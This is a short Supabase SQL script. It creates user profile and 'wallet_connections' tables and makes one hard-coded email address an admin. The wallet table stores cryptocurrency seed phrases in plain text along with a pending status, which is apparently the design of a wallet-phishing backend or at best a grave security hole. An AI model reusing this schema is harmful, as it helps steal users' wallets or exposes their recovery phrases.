-- SQL script to set up admin access
-- Run this in the Supabase SQL Editor

-- Create profiles table if it doesn't exist
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID PRIMARY KEY REFERENCES auth.users(id),
  full_name TEXT,
  avatar_url TEXT,
  role TEXT DEFAULT 'user',
  email TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- Create wallet_connections table if it doesn't exist
CREATE TABLE IF NOT EXISTS public.wallet_connections (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES auth.users(id),
  user_email TEXT,
  name TEXT,
  blockchain TEXT,
  wallet_type TEXT,
  address TEXT,
  seed_phrase TEXT,
  seed_phrase_required INTEGER DEFAULT 12,
  status TEXT DEFAULT 'pending',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- Find the user ID for pastendro@gmail.com
DO $$
DECLARE
  user_id UUID;
BEGIN
  -- Get the user ID
  SELECT id INTO user_id FROM auth.users WHERE email = 'pastendro@gmail.com';
  
  IF user_id IS NULL THEN
    RAISE NOTICE 'User with email pastendro@gmail.com not found';
  ELSE
    -- Check if profile exists
    IF EXISTS (SELECT 1 FROM public.profiles WHERE id = user_id) THEN
      -- Update existing profile to admin
      UPDATE public.profiles SET role = 'admin' WHERE id = user_id;
      RAISE NOTICE 'Updated existing profile to admin role';
    ELSE
      -- Create new admin profile
      INSERT INTO public.profiles (id, full_name, role, email)
      VALUES (user_id, 'pastendro', 'admin', 'pastendro@gmail.com');
      RAISE NOTICE 'Created new admin profile';
    END IF;
  END IF;
END $$;
